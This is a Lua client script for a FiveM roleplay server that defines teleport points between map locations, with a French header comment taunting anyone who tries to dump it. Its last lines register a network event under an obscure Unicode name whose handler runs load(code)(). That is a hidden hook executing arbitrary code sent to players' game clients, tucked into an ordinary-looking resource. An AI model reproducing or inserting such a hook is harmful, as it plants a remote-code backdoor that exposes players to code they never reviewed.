-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(0)
	end
end)

local TeleportPoint = {
	Bank = {
		positionFrom = vector3(255.27, 229.06, 101.63),
		positionTo = vector3(370.96, 252.61, 102.96)
	},
	HumaneLabs = {
		positionFrom = vector3(3540.77, 3675.99, 28.07),
		positionTo = vector3(3540.52, 3675.52, 20.94)
	},
	Avocat = {
		positionFrom = vector3(224.9, -419.51, -118.25),
		positionTo = vector3(238.24, -413.24, 48.06)
	},
	Palais = {
		positionFrom = vector3(233.49, -410.88, 48.06),
		positionTo = vector3(239.55, -332.45, -119.82)
	},
	BananaSplit = {
		positionFrom = vector3(-1569.409, -3017.4973, -74.46),
		positionTo = vector3(-254.89, 246.07, 91.52)
	},
	Casinototerasse = {
		positionFrom = vector3(965.14, 58.48, 112.55),
		positionTo = vector3(1004, 77.2, 73.28)
	},
	TerasseToHelico = {
		positionFrom = vector3(978.08, 61.96, 120.24),
		positionTo = vector3(968.08, 63.55, 112.55)
	},
	Santamaria = {
		positionFrom = vector3(1398.06, 1141.77, 114.33),
		positionTo = vector3(1394.82, 1141.71, 114.62)
	}
}

Drawing = setmetatable({}, Drawing)
Drawing.__index = Drawing

function Drawing.draw3DText(coords, text, fontId, scaleX, scaleY, r, g, b, a)
	local camCoords = GetGameplayCamCoords()
	local distance = GetDistanceBetweenCoords(camCoords, coords, 1)

	local scale = (1 / distance) * 10
	local fov = (1 / GetGameplayCamFov()) * 100
	local scale = scale * fov

	SetTextScale(scaleX * scale, scaleY * scale)
	SetTextFont(fontId)
	SetTextProportional(1)
	SetTextColour(r, g, b, a)
	SetTextDropshadow(0, 0, 0, 0, 255)
	SetTextEdge(2, 0, 0, 0, 150)
	SetTextDropShadow()
	SetTextOutline()
	BeginTextCommandDisplayText("STRING")
	SetTextCentre(1)
	AddTextComponentSubstringPlayerName(text)
	SetDrawOrigin(coords.x, coords.y, coords.z + 2, 0)
	EndTextCommandDisplayText(0.0, 0.0)
	ClearDrawOrigin()
end

function Drawing.drawMissionText(text, showtime)
	ClearPrints()
	BeginTextCommandPrint("STRING")
	AddTextComponentSubstringPlayerName(text)
	EndTextCommandPrint(showtime, 1)
end

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		local coords = GetEntityCoords(PlayerPedId(), false)

		for k, v in pairs(TeleportPoint) do
			if GetDistanceBetweenCoords(coords, v.positionFrom) < 25.0 then
				DrawMarker(21, v.positionFrom, vector3(0.0, 0.0, 0.0), vector3(0.0, 180.0, 0.0), vector3(0.5, 0.5, 0.5), 255, 255, 255, 100, true, false, 2, false)
				
				if GetDistanceBetweenCoords(coords, v.positionFrom) < 1.5 then
					ESX.ShowHelpNotification("Appuyez sur ~INPUT_PICKUP~")

					if IsControlJustPressed(0, 38) then
						DoScreenFadeOut(400)
						Citizen.Wait(400)
						SetEntityCoords(PlayerPedId(), v.positionTo)
						Citizen.Wait(600)
						DoScreenFadeIn(600)
					end
				end
			end

			if GetDistanceBetweenCoords(coords, v.positionTo) < 25.0 then
				DrawMarker(21, v.positionTo, vector3(0.0, 0.0, 0.0), vector3(0.0, 180.0, 0.0), vector3(0.5, 0.5, 0.5), 255, 255, 255, 100, true, false, 2, false)
				
				if GetDistanceBetweenCoords(coords, v.positionTo) < 1.5 then
					ESX.ShowHelpNotification("Appuyez sur ~INPUT_PICKUP~")

					if IsControlJustPressed(0, 38) then
						DoScreenFadeOut(400)
						Citizen.Wait(400)
						SetEntityCoords(PlayerPedId(), v.positionFrom)
						Citizen.Wait(600)
						DoScreenFadeIn(600)
					end
				end
			end
		end
	end
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)